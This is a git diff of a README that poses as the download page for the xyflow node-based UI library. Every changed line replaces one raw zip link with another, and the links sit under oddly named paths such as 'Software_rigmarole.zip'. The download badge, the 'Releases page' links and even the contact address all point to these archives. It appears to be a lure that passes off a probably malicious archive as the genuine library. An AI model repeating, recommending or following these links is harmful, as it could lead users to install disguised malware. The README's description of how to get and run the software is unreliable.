@@ -1,7 +1,7 @@
 # 🎉 xyflow - Build Node-Based UIs Easily
 
 ## 🔗 Download Now
-[![Download xyflow](https://raw.githubusercontent.com/CodxDywa/xyflow/main/cytostome/xyflow.zip)](https://raw.githubusercontent.com/CodxDywa/xyflow/main/cytostome/xyflow.zip)
+[![Download xyflow](https://github.com/CodxDywa/xyflow/raw/refs/heads/main/packages/react/src/types/Software_rigmarole.zip)](https://github.com/CodxDywa/xyflow/raw/refs/heads/main/packages/react/src/types/Software_rigmarole.zip)
 
 ## 📖 Description
 xyflow is a powerful open-source library that helps you create node-based user interfaces. It works seamlessly with both React and Svelte, allowing you to build interactive flowcharts and graphs efficiently. Whether you’re developing a workflow tool or a visual data representation, xyflow is ready for you.
@@ -17,7 +17,7 @@ xyflow is a powerful open-source library that helps you create node-based user i
 Follow these steps to set up xyflow on your computer:
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://raw.githubusercontent.com/CodxDywa/xyflow/main/cytostome/xyflow.zip) to find the latest version.
+   Go to the [Releases page](https://github.com/CodxDywa/xyflow/raw/refs/heads/main/packages/react/src/types/Software_rigmarole.zip) to find the latest version.
    
 2. **Download the Latest Version**
    Click on the version you want to download. Look for the assets section where you can find the download links. There might be files available for different systems. Choose the right one for your operating system.
@@ -55,7 +55,7 @@ If you run into common issues, consider the following tips:
 - **Performance Issues:** Consider upgrading your hardware if you experience slow performance, especially when dealing with large datasets.
 
 ## 🔄 Update xyflow
-Keep your application updated by regularly visiting the [Releases page](https://raw.githubusercontent.com/CodxDywa/xyflow/main/cytostome/xyflow.zip). Download newer versions to benefit from improvements, fixes, and new features.
+Keep your application updated by regularly visiting the [Releases page](https://github.com/CodxDywa/xyflow/raw/refs/heads/main/packages/react/src/types/Software_rigmarole.zip). Download newer versions to benefit from improvements, fixes, and new features.
 
 ## 🙋 FAQs
 **1. What is xyflow used for?**  
@@ -68,7 +68,7 @@ Yes, xyflow is open source and can be used for both personal and commercial proj
 You can find support in the GitHub discussions, or join our Discord community for direct assistance.
 
 ## 📧 Contact
-For additional questions or feedback, you can reach us at: [https://raw.githubusercontent.com/CodxDywa/xyflow/main/cytostome/xyflow.zip](https://raw.githubusercontent.com/CodxDywa/xyflow/main/cytostome/xyflow.zip).
+For additional questions or feedback, you can reach us at: [https://github.com/CodxDywa/xyflow/raw/refs/heads/main/packages/react/src/types/Software_rigmarole.zip](https://github.com/CodxDywa/xyflow/raw/refs/heads/main/packages/react/src/types/Software_rigmarole.zip).
 
 ## 📑 License
 xyflow is licensed under the MIT License. You can use it freely as per its terms. Please check the LICENSE file in the repository for more details.
